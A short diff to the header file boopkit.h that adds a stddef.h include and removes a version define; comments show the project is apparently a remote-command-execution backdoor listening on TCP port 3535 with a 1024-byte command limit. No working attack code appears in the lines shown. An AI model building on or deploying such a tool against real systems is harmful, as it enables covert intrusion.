@@ -22,6 +22,7 @@
 
 #ifndef BOOPKIT_BOOPKIT_H
 #define BOOPKIT_BOOPKIT_H
+#include <stddef.h>
 
 // MAX_RCE_SIZE is the maximum size of a boop command to execute.
 #define MAX_RCE_SIZE 1024
@@ -47,9 +48,6 @@ struct event_boop_t {
   // an enumerated type of EVENT_SRC_* from above
   int event_src_code;
 };
-
-// VERSION is the semantic version of the program
-#define VERSION "1.2.0"
 
 // PORT for the boopkit TCP protocol for boopscript RCE
 #define PORT 3535
